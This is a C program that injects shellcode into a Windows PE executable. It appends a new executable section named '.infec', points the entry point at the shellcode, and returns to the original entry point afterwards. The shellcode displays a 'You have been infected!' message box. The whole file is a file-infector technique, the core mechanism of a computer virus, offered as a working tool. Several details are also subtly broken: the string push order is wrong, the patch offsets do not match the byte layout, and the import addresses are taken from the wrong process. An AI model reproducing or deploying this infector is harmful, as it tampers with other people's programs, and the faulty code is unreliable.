#include <windows.h>
#include <stdio.h>
#include <string.h>

// Simple shellcode that uses LoadLibraryA/GetProcAddress to call MessageBoxA
unsigned char shellcode[] = {
    0x60,                               // pushad
    0x9C,                               // pushfd
    
    // Push "user32.dll" string
    0x68, 'u','s','e','r',              // push "user"
    0x68, '3','2','.','d',              // push "32.d"
    0x68, 'l','l',0x00,0x00,            // push "ll\0\0"
    0x54,                               // push esp (pointer to "user32.dll")
    0xFF, 0x15, 0x00,0x00,0x00,0x00,    // call [LoadLibraryA]
    
    // Push "MessageBoxA" string
    0x68, 'B','o','x','A',              // push "BoxA"
    0x68, 's','a','g','e',              // push "sage"
    0x68, 'M','e','s','s',              // push "Mess"
    0x54,                               // push esp (pointer to "MessageBoxA")
    0x50,                               // push eax (hModule returned by LoadLibraryA)
    0xFF, 0x15, 0x00,0x00,0x00,0x00,    // call [GetProcAddress]
    
    // Call MessageBoxA(NULL, "You have been infected!", "Notice", MB_OK)
    0x6A, 0x00,                          // push 0 (MB_OK)
    0x68, 0x00,0x00,0x00,0x00,          // push offset caption (filled at runtime)
    0x68, 0x00,0x00,0x00,0x00,          // push offset message (filled at runtime)
    0x6A, 0x00,                          // push 0 (hWnd = NULL)
    0xFF, 0xD0,                         // call eax (MessageBoxA)
    
    0x9D,                               // popfd
    0x61,                               // popad
    
    0xE9, 0x00,0x00,0x00,0x00,          // jmp OriginalEntryPoint (filled at runtime)
    
    // Data section: caption and message
    'N','o','t','i','c','e',0x00,
    'Y','o','u',' ','h','a','v','e',' ','b','e','e','n',' ','i','n','f','e','c','t','e','d','!',0x00
};

#define ALIGN_UP(x, align) (((x) + ((align)-1)) & ~((align)-1))

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <file.exe>\n", argv[0]);
        return 1;
    }

    FILE *f = fopen(argv[1], "r+b");
    if (!f) {
        perror("File open error");
        return 1;
    }

    IMAGE_DOS_HEADER dos;
    IMAGE_NT_HEADERS32 nt;

    fread(&dos, sizeof(dos), 1, f);
    fseek(f, dos.e_lfanew, SEEK_SET);
    fread(&nt, sizeof(nt), 1, f);

    DWORD original_ep = nt.OptionalHeader.AddressOfEntryPoint;

    IMAGE_SECTION_HEADER last_sec;
    fseek(f, dos.e_lfanew + sizeof(IMAGE_NT_HEADERS32)
          + (nt.FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    fread(&last_sec, sizeof(IMAGE_SECTION_HEADER), 1, f);

    IMAGE_SECTION_HEADER new_sec = {0};
    memcpy(new_sec.Name, ".infec", 6);

    new_sec.VirtualAddress = ALIGN_UP(last_sec.VirtualAddress + last_sec.Misc.VirtualSize,
                                      nt.OptionalHeader.SectionAlignment);
    new_sec.PointerToRawData = ALIGN_UP(last_sec.PointerToRawData + last_sec.SizeOfRawData,
                                        nt.OptionalHeader.FileAlignment);
    new_sec.SizeOfRawData = ALIGN_UP(sizeof(shellcode), nt.OptionalHeader.FileAlignment);
    new_sec.Misc.VirtualSize = sizeof(shellcode);
    new_sec.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    DWORD base = nt.OptionalHeader.ImageBase + new_sec.VirtualAddress;

    // Fill in LoadLibraryA and GetProcAddress IAT offsets
    DWORD iat_LoadLibraryA = (DWORD)&LoadLibraryA - nt.OptionalHeader.ImageBase;
    DWORD iat_GetProcAddress = (DWORD)&GetProcAddress - nt.OptionalHeader.ImageBase;
    memcpy(shellcode + 9,   &iat_LoadLibraryA, 4);  // call [LoadLibraryA]
    memcpy(shellcode + 34,   &iat_GetProcAddress, 4); // call [GetProcAddress]

    // Fill in caption and message addresses
    DWORD caption_rva = base + sizeof(shellcode) - 21;
    DWORD message_rva = base + sizeof(shellcode) - 40;
    memcpy(shellcode +  27, &caption_rva, 4);
    memcpy(shellcode +  32, &message_rva, 4);

    // Fill in jump back to original EP
    DWORD jmp_offset = original_ep - (new_sec.VirtualAddress + 47);
    memcpy(shellcode +  42, &jmp_offset, 4);

    // Update NT headers
    nt.OptionalHeader.AddressOfEntryPoint = new_sec.VirtualAddress;
    nt.OptionalHeader.SizeOfImage = ALIGN_UP(new_sec.VirtualAddress + new_sec.Misc.VirtualSize,
                                             nt.OptionalHeader.SectionAlignment);

    fseek(f, new_sec.PointerToRawData, SEEK_SET);
    fwrite(shellcode, sizeof(shellcode), 1, f);

    fseek(f, dos.e_lfanew + sizeof(IMAGE_NT_HEADERS32)
          + nt.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    fwrite(&new_sec, sizeof(new_sec), 1, f);

    nt.FileHeader.NumberOfSections++;
    fseek(f, dos.e_lfanew, SEEK_SET);
    fwrite(&nt, sizeof(nt), 1, f);

    fclose(f);
    printf("Injection successful!\n");
    return 0;
}
